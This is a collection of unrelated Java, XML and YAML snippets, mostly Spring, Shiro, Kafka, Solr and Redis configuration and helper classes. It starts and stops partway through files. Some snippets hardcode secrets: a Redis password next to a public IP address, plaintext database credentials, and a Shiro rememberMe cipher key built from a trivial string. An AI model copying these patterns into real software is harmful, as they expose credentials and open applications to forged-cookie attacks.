        public Object copy(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            return (size > 0)
                    ? copyNonEmpty(array, arraySize, sourceFrom, destinationFrom, size)
                    : new Object[arraySize];
        }
        private static Object copyNonEmpty(Object array, int arraySize, int sourceFrom, int destinationFrom, int size) {
            final Object[] result = new Object[arraySize];
            System.arraycopy(array, sourceFrom, result, destinationFrom, size); /* has to be near the object allocation to avoid zeroing out the array */
            return result;
        }
    }
}
==============================================================================================================
branches:
  only:
  - master
  - /^(\d+\.){2}(\d+){1}(\.[a-zA-Z\d]+)?$/
  - hawkular-1275
==============================================================================================================
<?xml version='1.0' encoding='utf-8'?>
<Context>
    <WatchedResource>WEB-INF/web.xml</WatchedResource>
 
 
 
    <Resource
            factory="org.apache.tomcat.jdbc.pool.DataSourceFactory"
            name="jdbc/tomcatDataSource"
            auth="Container"
            type="javax.sql.DataSource"
            initialSize="1"
            maxActive="20"
            maxIdle="3"
            minIdle="1"
            maxWait="5000"
            username="josediaz"
            password="josediaz"
            driverClassName="org.postgresql.Driver"
            validationQuery="SELECT 'OK'"
            testWhileIdle="true"
            testOnBorrow="true"
            numTestsPerEvictionRun="5"
            timeBetweenEvictionRunsMillis="30000"
            minEvictableIdleTimeMillis="60000"
            url="jdbc:postgresql://localhost:5432/uaiContacts" />
 
</Context>

import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.integration.dsl.IntegrationFlow;
import org.springframework.integration.dsl.IntegrationFlows;
import org.springframework.integration.dsl.SourcePollingChannelAdapterSpec;
import org.springframework.integration.dsl.kafka.Kafka;
import org.springframework.integration.dsl.kafka.KafkaHighLevelConsumerMessageSourceSpec;
import org.springframework.integration.dsl.support.Consumer;
import org.springframework.integration.kafka.support.ZookeeperConnect;

import de.codecentric.ebss.service.OrderEntryService;

@Configuration
public class CommoditiesReservationConsumerConfiguration {

	private Log log = LogFactory.getLog(getClass());

	@Autowired 
	private OrderEntryService orderEntryService;
	
	@Autowired
	private KafkaConfig kafkaConfig;

	@Bean
	IntegrationFlow consumer() {

		log.info("starting consumer..");

		KafkaHighLevelConsumerMessageSourceSpec messageSourceSpec = Kafka
				.inboundChannelAdapter(
						new ZookeeperConnect(this.kafkaConfig
								.getZookeeperAddress()))
				.consumerProperties(
						props -> props.put("auto.offset.reset", "smallest")
								.put("auto.commit.interval.ms", "100"))
				.addConsumer(
						"myGroup",
						metadata -> metadata
								.consumerTimeout(100)
								.topicStreamMap(
										m -> m.put(this.kafkaConfig.getTopic(),
												1)).maxMessages(1)
								.valueDecoder(String::new));

		Consumer<SourcePollingChannelAdapterSpec> endpointConfigurer = e -> e.poller(p -> p.fixedDelay(100));

		return IntegrationFlows
				.from(messageSourceSpec, endpointConfigurer)
				.<Map<String, ConcurrentHashMap<String, String>>> handle(
						(payload, headers) -> {
							payload.entrySet().forEach(
									e -> orderEntryService.createOrderEntryFromJson(e.getValue()));
							return null;
						}).get();
	}
}
==============================================================================================================
import java.util.List;

import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.solr.core.query.result.FacetPage;
import org.springframework.data.solr.core.query.result.HighlightPage;
import org.springframework.data.solr.repository.Boost;
import org.springframework.data.solr.repository.Facet;
import org.springframework.data.solr.repository.Highlight;
import org.springframework.data.solr.repository.Query;
import org.springframework.data.solr.repository.SolrCrudRepository;

import com.mscharhag.solr.document.Book;

public interface BookRepository extends SolrCrudRepository<Book, String> {

	List<Book> findByName(String name);
	
	Page<Book> findByNameOrDescription(@Boost(2) String name, String description, Pageable pageable);

	@Query("name:?0")
	@Facet(fields = { "categories_txt" }, limit = 5)
	FacetPage<Book> findByNameAndFacetOnCategories(String name, Pageable page);
	
	@Highlight(prefix = "<highlight>", postfix = "</highlight>")
	HighlightPage<Book> findByDescription(String description, Pageable pageable);
	
}

import org.apache.solr.client.solrj.SolrServer;
import org.apache.solr.client.solrj.impl.HttpSolrServer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.data.solr.core.SolrTemplate;
import org.springframework.data.solr.repository.config.EnableSolrRepositories;

@ComponentScan
@EnableSolrRepositories("com.mscharhag.solr.repository")
public class Application {

	@Bean
	public SolrServer solrServer() {
		return new HttpSolrServer("http://localhost:8983/solr");
	}

	@Bean
	public SolrTemplate solrTemplate(SolrServer server) throws Exception {
		return new SolrTemplate(server);
	}
}
==============================================================================================================
    /**
     * This inner class configures a WebSecurityConfigurerAdapter instance for
     * the Spring Actuator web service context paths.
     * 
     * @author Matt Warman
     */
    @Configuration
    @Order(2)
    public static class ActuatorWebSecurityConfigurerAdapter
            extends WebSecurityConfigurerAdapter {

        @Override
        protected void configure(HttpSecurity http) throws Exception {

            // @formatter:off
            
            http
              .antMatcher("/actuators/**")
                .authorizeRequests()
                  .anyRequest().hasRole("SYSADMIN")
              .and()
              .httpBasic()
              .and()
              .sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
              .and()
              .csrf()
                .disable();
            
            // @formatter:on

        }

    }
	
	import java.util.Collection;
import java.util.Date;

import org.example.ws.model.Role;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.stereotype.Repository;

/**
 * The RoleRepository interface is a Spring Data JPA data repository for Role
 * entities. The RoleRepository provides all the data access behaviors exposed
 * by <code>JpaRepository</code> and additional custom behaviors may be defined
 * in this interface.
 * 
 * @author Matt Warman
 */
@Repository
public interface RoleRepository extends JpaRepository<Role, Long> {

    /**
     * Query for a collection of Role entities by the effectiveAt and expiresAt
     * attribute values. Order the collection by the value of the ordinal
     * attribute.
     * 
     * Uses the Query Method approach to search the database.
     * 
     * @param effectiveAt A Date effectiveAt attribute value.
     * @param expiresAt A Date expiresAt attribute value.
     * @return A Collection of Role entity model classes.
     */
    Collection<Role> findByEffectiveAtBeforeAndExpiresAtAfterOrExpiresAtNullOrderByOrdinalAsc(
            Date effectiveAt, Date expiresAt);

    /**
     * Query for a collection of Role entities by the effectiveAt and expiresAt
     * attribute values. Order the collection by the value of the ordinal
     * attribute.
     * 
     * Uses a Query annotated JPQL statement to search the database.
     *
     * @param effectiveAt A Date effectiveAt attribute value.
     * @return A Collection of Role entity model classes.
     */
    @Query("SELECT r FROM Role r WHERE r.effectiveAt <= :effectiveAt AND (r.expiresAt IS NULL OR r.expiresAt > :effectiveAt) ORDER BY r.ordinal ASC")
    Collection<Role> findAllEffective(@Param("effectiveAt") Date effectiveAt);

    /**
     * Query for a single Role entity by the code, effectiveAt, and expiresAt
     * attribute values.
     * 
     * Uses the Query Method approach to search the database.
     * 
     * @param code A String code attribute value.
     * @param effectiveAt A Date effectiveAt attribute value.
     * @param expiresAt A Date expiresAt attribute value.
     * @return A Role object or <code>null</code> if not found.
     */
    Role findByCodeAndEffectiveAtBeforeAndExpiresAtAfterOrExpiresAtNull(
            String code, Date effectiveAt, Date expiresAt);

    /**
     * Query for a single Role entity by the code, effectiveAt, and expiresAt
     * attribute values.
     * 
     * Uses a Query annotated JPQL statement to search the database.
     * 
     * @param code A String code attribute value.
     * @param effectiveAt A Date effectiveAt attribute value.
     * @return A Role object or <code>null</code> if not found.
     */
    @Query("SELECT r FROM Role r WHERE r.code = :code AND r.effectiveAt <= :effectiveAt AND (r.expiresAt IS NULL OR r.expiresAt > :effectiveAt)")
    Role findByCodeAndEffective(@Param("code") String code,
            @Param("effectiveAt") Date effectiveAt);

}
==============================================================================================================
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;

import org.apache.commons.io.FilenameUtils;
import org.springframework.util.Assert;

import com.google.common.io.Files;

public class ImageHelper {

	/** 背景颜色 */
	private static final Color BACKGROUND_COLOR = Color.white;

	/** 目标图片品质(取值范围: 0 - 100) */
	private static final int DEST_QUALITY = 88;

	public static void zoom(File srcFile, File destFile, int destWidth, int destHeight) {
		Assert.notNull(srcFile);
		Assert.notNull(destFile);
		Assert.state(destWidth > 0);
		Assert.state(destHeight > 0);

		Graphics2D graphics2D = null;
		ImageOutputStream imageOutputStream = null;
		ImageWriter imageWriter = null;
		try {
			BufferedImage srcBufferedImage = ImageIO.read(srcFile);
			int srcWidth = srcBufferedImage.getWidth();
			int srcHeight = srcBufferedImage.getHeight();
			
			if(srcWidth < destWidth || srcHeight < destHeight) {
				Files.copy(srcFile, destFile);
				return;
			}
			
			int width = destWidth;
			int height = destHeight;
			if (srcHeight >= srcWidth) {
				width = (int) Math.round(((destHeight * 1.0 / srcHeight) * srcWidth));
			} else {
				height = (int) Math.round(((destWidth * 1.0 / srcWidth) * srcHeight));
			}
			BufferedImage destBufferedImage = new BufferedImage(destWidth, destHeight, BufferedImage.TYPE_INT_RGB);
			graphics2D = destBufferedImage.createGraphics();
			graphics2D.setBackground(BACKGROUND_COLOR);
			graphics2D.clearRect(0, 0, destWidth, destHeight);
			graphics2D.drawImage(srcBufferedImage.getScaledInstance(width, height, Image.SCALE_SMOOTH),
					(destWidth / 2) - (width / 2), (destHeight / 2) - (height / 2), null);

			imageOutputStream = ImageIO.createImageOutputStream(destFile);
			imageWriter = ImageIO.getImageWritersByFormatName(FilenameUtils.getExtension(destFile.getName())).next();
			imageWriter.setOutput(imageOutputStream);
			ImageWriteParam imageWriteParam = imageWriter.getDefaultWriteParam();
			imageWriteParam.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
			imageWriteParam.setCompressionQuality((float) (DEST_QUALITY / 100.0));
			imageWriter.write(null, new IIOImage(destBufferedImage, null, null), imageWriteParam);
			imageOutputStream.flush();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			if (graphics2D != null) {
				graphics2D.dispose();
			}
			if (imageWriter != null) {
				imageWriter.dispose();
			}
			if (imageOutputStream != null) {
				try {
					imageOutputStream.close();
				} catch (IOException e) {
				}
			}
		}

	}

}

import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.HashMap;
import java.util.Map;

import javax.imageio.ImageIO;

import com.google.zxing.BarcodeFormat;
import com.google.zxing.EncodeHintType;
import com.google.zxing.MultiFormatWriter;
import com.google.zxing.common.BitMatrix;

public class QrCodeHelper {
	public static void writeToFile(String contents, int width, int height, File file) {
		Map<EncodeHintType, Object> hints = new HashMap<>();
		hints.put(EncodeHintType.CHARACTER_SET, "utf-8");

		try {
			BitMatrix bitMatrix = new MultiFormatWriter().encode(contents, BarcodeFormat.QR_CODE, width, height, hints);
			writeToFile(bitMatrix, "png", file);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void writeToStream(String contents, int width, int height, OutputStream outputStream) {
		Map<EncodeHintType, Object> hints = new HashMap<>();
		hints.put(EncodeHintType.CHARACTER_SET, "utf-8");

		try {
			BitMatrix bitMatrix = new MultiFormatWriter().encode(contents, BarcodeFormat.QR_CODE, width, height, hints);
			writeToStream(bitMatrix, "png", outputStream);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static final int BLACK = 0xFF000000;
	private static final int WHITE = 0xFFFFFFFF;

	private static BufferedImage toBufferedImage(BitMatrix matrix) {
		int width = matrix.getWidth();
		int height = matrix.getHeight();
		BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
		for (int x = 0; x < width; x++) {
			for (int y = 0; y < height; y++) {
				image.setRGB(x, y, matrix.get(x, y) ? BLACK : WHITE);
			}
		}
		return image;
	}

	private static void writeToFile(BitMatrix matrix, String format, File file) throws IOException {
		BufferedImage image = toBufferedImage(matrix);
		if (!ImageIO.write(image, format, file)) {
			throw new IOException("Could not write an image of format " + format + " to " + file);
		}
	}

	private static void writeToStream(BitMatrix matrix, String format, OutputStream stream) throws IOException {
		BufferedImage image = toBufferedImage(matrix);
		if (!ImageIO.write(image, format, stream)) {
			throw new IOException("Could not write an image of format " + format);
		}
	}
}
==============================================================================================================
import java.util.Collection;
import java.util.Set;

import org.apache.shiro.cache.Cache;
import org.apache.shiro.cache.CacheException;
import org.infinispan.commons.api.BasicCache;
import org.springframework.util.Assert;

public class ShiroCache<K, V> implements Cache<K, V> {

	private final BasicCache<K, V> nativeCache;

	public ShiroCache(final BasicCache<K, V> nativeCache) {
		Assert.notNull(nativeCache, "A non-null Infinispan cache implementation is required");
		this.nativeCache = nativeCache;
	}

	@Override
	public V get(K key) throws CacheException {
		return this.nativeCache.get(key);
	}

	@Override
	public V put(K key, V value) throws CacheException {
		return this.nativeCache.put(key, value);
	}

	@Override
	public V remove(K key) throws CacheException {
		return this.nativeCache.remove(key);
	}

	@Override
	public void clear() throws CacheException {
		this.nativeCache.clear();
	}

	@Override
	public int size() {
		return this.nativeCache.size();
	}

	@Override
	public Set<K> keys() {
		return this.nativeCache.keySet();
	}

	@Override
	public Collection<V> values() {
		return this.nativeCache.values();
	}

}
==============================================================================================================
import org.apache.shiro.cache.CacheManager;
import org.apache.shiro.mgt.RememberMeManager;
import org.apache.shiro.mgt.SecurityManager;
import org.apache.shiro.session.mgt.ExecutorServiceSessionValidationScheduler;
import org.apache.shiro.session.mgt.SessionManager;
import org.apache.shiro.session.mgt.SessionValidationScheduler;
import org.apache.shiro.session.mgt.eis.EnterpriseCacheSessionDAO;
import org.apache.shiro.session.mgt.eis.JavaUuidSessionIdGenerator;
import org.apache.shiro.session.mgt.eis.SessionDAO;
import org.apache.shiro.session.mgt.eis.SessionIdGenerator;
import org.apache.shiro.spring.LifecycleBeanPostProcessor;
import org.apache.shiro.web.mgt.CookieRememberMeManager;
import org.apache.shiro.web.mgt.DefaultWebSecurityManager;
import org.apache.shiro.web.servlet.Cookie;
import org.apache.shiro.web.servlet.SimpleCookie;
import org.apache.shiro.web.session.mgt.DefaultWebSessionManager;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.beans.factory.config.MethodInvokingFactoryBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import com.whenling.module.security.shiro.cache.infinispan.ShiroCacheManager;

/**
 * 安全配置
 * 
 * @作者 孔祥溪
 * @博客 http://ken.whenling.com
 * @创建时间 2016年3月1日 下午7:08:55
 */
@Configuration
public class SecurityConfiguration {

	@Value("#{T(org.apache.shiro.codec.Base64).decode('asdqwe123')}")
	private byte[] cipherKey;

	@Bean
	public SecurityManager securityManager() {
		DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();
		securityManager.setCacheManager(shiroCacheManager());
//		securityManager.setSessionManager(sessionManager());
//		securityManager.setRememberMeManager(rememberMeManager());
		// securityManager.setRealm(databaseRealm());
		return securityManager;
	}

	@Bean
	public RememberMeManager rememberMeManager() {
		CookieRememberMeManager rememberMeManager = new CookieRememberMeManager();
		rememberMeManager.setCipherKey(cipherKey);
		rememberMeManager.setCookie(rememberMeCookie());
		return rememberMeManager;
	}

	// @Bean
	// public Cookie sessionIdCookie() {
	// SimpleCookie cookie = new SimpleCookie("sid");
	// cookie.setMaxAge(-1);
	// return cookie;
	// }

	@Bean
	public Cookie rememberMeCookie() {
		SimpleCookie cookie = new SimpleCookie("rememberMe");
		cookie.setHttpOnly(true);
		cookie.setMaxAge(31536000);
		return cookie;
	}

	@Bean
	public SessionManager sessionManager() {
		DefaultWebSessionManager sessionManager = new DefaultWebSessionManager();
		sessionManager.setGlobalSessionTimeout(1000 * 60 * 30);
		sessionManager.setDeleteInvalidSessions(true);
		sessionManager.setSessionValidationSchedulerEnabled(true);
		SessionValidationScheduler sessionValidationScheduler = new ExecutorServiceSessionValidationScheduler(sessionManager);
		sessionManager.setSessionValidationScheduler(sessionValidationScheduler);
		sessionManager.setSessionDAO(sessionDAO());
//		sessionManager.setSessionIdCookieEnabled(true);
//		sessionManager.setSessionIdCookie(sessionIdCookie());
		return sessionManager;
	}

	@Bean
	public SessionDAO sessionDAO() {
		EnterpriseCacheSessionDAO sessionDAO = new EnterpriseCacheSessionDAO();
		sessionDAO.setActiveSessionsCacheName("sessionCache");
		sessionDAO.setSessionIdGenerator(sessionIdGenerator());
		return sessionDAO;
	}

	@Bean
	public SessionIdGenerator sessionIdGenerator() {
		JavaUuidSessionIdGenerator sessionIdGenerator = new JavaUuidSessionIdGenerator();
		return sessionIdGenerator;
	}

	@Bean
	public MethodInvokingFactoryBean setSecurityManager() {
		MethodInvokingFactoryBean factoryBean = new MethodInvokingFactoryBean();
		factoryBean.setStaticMethod("org.apache.shiro.SecurityUtils.setSecurityManager");
		factoryBean.setArguments(new Object[] { securityManager() });
		return factoryBean;
	}

	@Bean(name = "lifecycleBeanPostProcessor")
	public LifecycleBeanPostProcessor lifecycleBeanPostProcessor() {
		return new LifecycleBeanPostProcessor();
	}

	@Bean
	public CacheManager shiroCacheManager() {
		ShiroCacheManager shiroCacheManager = new ShiroCacheManager();
		return shiroCacheManager;
	}
}
==============================================================================================================
import java.io.IOException;
import java.util.Arrays;
import java.util.List;

import com.google.common.io.Closeables;

import redis.clients.jedis.Jedis;
import redis.clients.jedis.JedisPoolConfig;
import redis.clients.jedis.JedisShardInfo;
import redis.clients.jedis.Pipeline;
import redis.clients.jedis.ShardedJedis;
import redis.clients.jedis.ShardedJedisPipeline;
import redis.clients.jedis.ShardedJedisPool;
import redis.clients.jedis.Transaction;

public class RedisExample {

	public static void main(String[] args) {
		new RedisExample().testNormal();
	}

	// 普通同步方式
	public void testNormal() {// 12.526秒
		Jedis jedis = new Jedis("120.25.241.144", 6379);
		jedis.auth("b840fc02d52404542994");

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			jedis.set("n" + i, "n" + i);
			System.out.println(i);
		}
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		jedis.disconnect();
		try {
			Closeables.close(jedis, true);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// 事务方式(Transactions)
	public void testTrans() {// 0.304秒
		Jedis jedis = new Jedis("120.25.241.144", 6379);
		jedis.auth("b840fc02d52404542994");

		long start = System.currentTimeMillis();
		Transaction tx = jedis.multi();
		for (int i = 0; i < 1000; i++) {
			tx.set("n" + i, "n" + i);
			System.out.println(i);
		}
		tx.exec();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		jedis.disconnect();
		try {
			Closeables.close(jedis, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 管道(Pipelining)
	public void testPipelined() {// 0.076秒
		Jedis jedis = new Jedis("120.25.241.144", 6379);
		jedis.auth("b840fc02d52404542994");

		long start = System.currentTimeMillis();
		Pipeline pipeline = jedis.pipelined();
		for (int i = 0; i < 1000; i++) {
			pipeline.set("n" + i, "n" + i);
			System.out.println(i);
		}
		pipeline.syncAndReturnAll();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		jedis.disconnect();
		try {
			Closeables.close(jedis, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 管道中调用事务
	public void testCombPipelineTrans() {// 0.099秒
		Jedis jedis = new Jedis("120.25.241.144", 6379);
		jedis.auth("b840fc02d52404542994");

		long start = System.currentTimeMillis();
		Pipeline pipeline = jedis.pipelined();
		pipeline.multi();
		for (int i = 0; i < 1000; i++) {
			pipeline.set("n" + i, "n" + i);
			System.out.println(i);
		}
		pipeline.exec();
		pipeline.syncAndReturnAll();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		jedis.disconnect();
		try {
			Closeables.close(jedis, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 分布式直连同步调用
	public void testShardNormal() {// 13.619秒
		JedisShardInfo jedis = new JedisShardInfo("120.25.241.144", 6379);
		jedis.setPassword("b840fc02d52404542994");

		List<JedisShardInfo> shards = Arrays.asList(jedis);
		ShardedJedis sharding = new ShardedJedis(shards);

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			sharding.set("n" + i, "n" + i);
			System.out.println(i);
		}
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		sharding.disconnect();
		try {
			Closeables.close(sharding, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 分布式直连异步调用
	public void testShardPipelined() {// 0.127秒
		JedisShardInfo jedis = new JedisShardInfo("120.25.241.144", 6379);
		jedis.setPassword("b840fc02d52404542994");

		List<JedisShardInfo> shards = Arrays.asList(jedis);
		ShardedJedis sharding = new ShardedJedis(shards);
		ShardedJedisPipeline pipeline = sharding.pipelined();

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			pipeline.set("n" + i, "n" + i);
			System.out.println(i);
		}
		pipeline.syncAndReturnAll();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		sharding.disconnect();
		try {
			Closeables.close(sharding, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 分布式连接池同步调用
	public void testShardSimplePool() {// 12.642秒
		JedisShardInfo jedis = new JedisShardInfo("120.25.241.144", 6379);
		jedis.setPassword("b840fc02d52404542994");

		List<JedisShardInfo> shards = Arrays.asList(jedis);
		ShardedJedisPool pool = new ShardedJedisPool(new JedisPoolConfig(), shards);

		ShardedJedis sharding = pool.getResource();

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			sharding.set("n" + i, "n" + i);
			System.out.println(i);
		}
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		sharding.disconnect();
		pool.destroy();
		try {
			Closeables.close(sharding, true);
			Closeables.close(pool, true);
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	// 分布式连接池异步调用
	public void testShardPipelinnedPool() {// 0.124秒
		JedisShardInfo jedis = new JedisShardInfo("120.25.241.144", 6379);
		jedis.setPassword("b840fc02d52404542994");

		List<JedisShardInfo> shards = Arrays.asList(jedis);
		ShardedJedisPool pool = new ShardedJedisPool(new JedisPoolConfig(), shards);

		ShardedJedis sharding = pool.getResource();
		ShardedJedisPipeline pipeline = sharding.pipelined();

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			pipeline.set("n" + i, "n" + i);
			System.out.println(i);
		}
		pipeline.syncAndReturnAll();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		sharding.disconnect();
		pool.destroy();

		try {
			Closeables.close(sharding, true);
			Closeables.close(pool, true);
		} catch (IOException e) {
			e.printStackTrace();
		}

	}
}
==============================================================================================================
import org.springframework.beans.factory.config.PlaceholderConfigurerSupport;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.ComponentScan.Filter;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.EnableAspectJAutoProxy;
import org.springframework.stereotype.Controller;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;

import com.whenling.module.base.config.ConfigurationPropertySourcesPlaceholderConfigurer;
import com.whenling.module.base.config.StaticConfigurationSupplier;

/**
 * serlvet配置
 * 
 * @作者 孔祥溪
 * @博客 http://ken.whenling.com
 * @创建时间 2016年1月6日 上午12:00:05
 */
@Configuration
@ComponentScan(basePackages = { "com.whenling" }, useDefaultFilters = false, includeFilters = { @Filter({ Controller.class }),
		@Filter({ ServletSupport.class }) }, nameGenerator = FullBeanNameGenerator.class)
@EnableWebMvc
@EnableAspectJAutoProxy
public class ServletConfiguration {

	@Bean
	public static PlaceholderConfigurerSupport placeholderConfigurer() {
		return new ConfigurationPropertySourcesPlaceholderConfigurer(StaticConfigurationSupplier.getConfiguration());
	}
}

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.EnableAspectJAutoProxy;
import org.springframework.context.annotation.FilterType;
import org.springframework.core.task.TaskExecutor;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;
import org.springframework.stereotype.Controller;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;

/**
 * 根配置
 * 
 * @作者 孔祥溪
 * @博客 http://ken.whenling.com
 * @创建时间 2016年1月5日 下午11:59:47
 */
@Configuration
@ComponentScan(basePackages = { "com.whenling" }, excludeFilters = {
		@ComponentScan.Filter(value = Controller.class, type = FilterType.ANNOTATION),
		@ComponentScan.Filter(value = EnableWebMvc.class, type = FilterType.ANNOTATION),
		@ComponentScan.Filter(value = ServletSupport.class, type = FilterType.ANNOTATION) })
@EnableAspectJAutoProxy
public class RootConfiguration {

	@Bean
	public TaskExecutor taskExecutor() {
		ThreadPoolTaskExecutor threadPoolTaskExecutor = new ThreadPoolTaskExecutor();
		threadPoolTaskExecutor.setCorePoolSize(5);
		threadPoolTaskExecutor.setMaxPoolSize(50);
		threadPoolTaskExecutor.setQueueCapacity(1000);
		threadPoolTaskExecutor.setKeepAliveSeconds(60);
		return threadPoolTaskExecutor;
	}
}
==============================================================================================================
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.servlet.http.HttpServletRequest;

import org.springframework.web.util.WebUtils;

/**
 * web工具
 * 
 * @作者 孔祥溪
 * @博客 http://ken.whenling.com
 * @创建时间 2016年3月1日 下午4:49:04
 */
public class WebHelper {

	static String phoneReg = "\\b(ip(hone|od)|android|opera m(ob|in)i" + "|windows (phone|ce)|blackberry"
			+ "|s(ymbian|eries60|amsung)|p(laybook|alm|rofile/midp" + "|laystation portable)|nokia|fennec|htc[-_]"
			+ "|mobile|up.browser|[1-4][0-9]{2}x[1-4][0-9]{2})\\b";
	static String tableReg = "\\b(ipad|tablet|(Nexus 7)|up.browser" + "|[1-4][0-9]{2}x[1-4][0-9]{2})\\b";

	// 移动设备正则匹配：手机端、平板
	static Pattern phonePat = Pattern.compile(phoneReg, Pattern.CASE_INSENSITIVE);
	static Pattern tablePat = Pattern.compile(tableReg, Pattern.CASE_INSENSITIVE);

	public static boolean isAjax(HttpServletRequest request) {
		return (request.getHeader("X-Requested-With") != null
				&& "XMLHttpRequest".equals(request.getHeader("X-Requested-With").toString()));
	}

	/**
	 * 判断是否是手机访问
	 */
	public static boolean isMobileAccess(HttpServletRequest request) {
		boolean isFromMobile = false;
		// 检查是否已经记录访问方式（移动端或pc端）
		Object ua = WebUtils.getSessionAttribute(request, "ua");
		if (null == ua) {
			try {
				String userAgent = request.getHeader("USER-AGENT").toLowerCase();
				if (null == userAgent) {
					userAgent = "";
				}
				isFromMobile = checkUserAgent(userAgent);
				// 判断是否为移动端访问
				if (isFromMobile) {
					WebUtils.setSessionAttribute(request, "ua", "mobile");
				} else {
					WebUtils.setSessionAttribute(request, "ua", "pc");
				}
			} catch (Exception e) {
			}
		} else {
			isFromMobile = ua.equals("mobile");
		}

		return isFromMobile;
	}

	private static boolean checkUserAgent(String userAgent) {
		if (null == userAgent) {
			userAgent = "";
		}
		// 匹配
		Matcher matcherPhone = phonePat.matcher(userAgent);
		Matcher matcherTable = tablePat.matcher(userAgent);
		if (matcherPhone.find() || matcherTable.find()) {
			return true;
		} else {
			return false;
		}
	}
}
==============================================================================================================
@Value("${hibernate.query.substitutions?:true 1, false 0}")
jpaProperties.put("hibernate.cache.infinispan.cfg", hibernateCacheInfinispanCfg);
jpaProperties.put("javax.persistence.sharedCache.mode", javaxPersistenceSharedCacheMode);
==============================================================================================================
<configuration>
    <conversionRule conversionWord="a" converterClass="com.sap.core.js.logging.converter.ACHPatternConverter"/>
    <conversionRule conversionWord="b" converterClass="com.sap.core.js.logging.converter.BundleNamePatternConverter"/>
    <conversionRule conversionWord="s" converterClass="com.sap.core.js.logging.converter.DSRPatternConverter"/>
    <conversionRule conversionWord="z" converterClass="com.sap.core.js.logging.converter.SpaceApplPatternConverter"/>
    <conversionRule conversionWord="u" converterClass="com.sap.core.js.logging.converter.UserPatternConverter"/>
    <conversionRule conversionWord="o" converterClass="com.sap.core.js.logging.converter.UTFOffsetPatternConverter"/>

    <jmxConfigurator/>

    <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
        <encoder>
            <pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n</pattern>
        </encoder>
    </appender>

    <root level="INFO">
        <appender-ref ref="STDOUT"/>
    </root>
</configuration>
==============================================================================================================
pip install allure-pytest
pytest --alluredir=/tmp/my_allure_results
==============================================================================================================
import com.trasier.wsdl.weather.GetWeatherRequest;
import com.trasier.wsdl.weather.GetWeatherResponse;
import org.springframework.ws.client.core.support.WebServiceGatewaySupport;
import org.springframework.ws.soap.client.core.SoapActionCallback;

public class WeatherWsClient extends WebServiceGatewaySupport {

    public GetWeatherResponse getWeather(String cityCode) {
        GetWeatherRequest request = new GetWeatherRequest();
        request.setCityCode(cityCode);
        return (GetWeatherResponse) getWebServiceTemplate()
                .marshalSendAndReceive("http://localhost:8002/ws/weather", request,
                        new SoapActionCallback("http://trasier.com/example/weather-web-service/GetWeatherRequest"));
    }
}

import com.trasier.springboot.ping.WeatherWsClient;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.oxm.jaxb.Jaxb2Marshaller;
import org.springframework.web.client.RestTemplate;

@Configuration
public class WeatherConfiguration {

    @Bean
    public RestTemplate restTemplate() {
        return new RestTemplate();
    }

    @Bean
    public Jaxb2Marshaller marshaller() {
        Jaxb2Marshaller marshaller = new Jaxb2Marshaller();
        marshaller.setContextPath("com.trasier.wsdl.weather");
        return marshaller;
    }

    @Bean
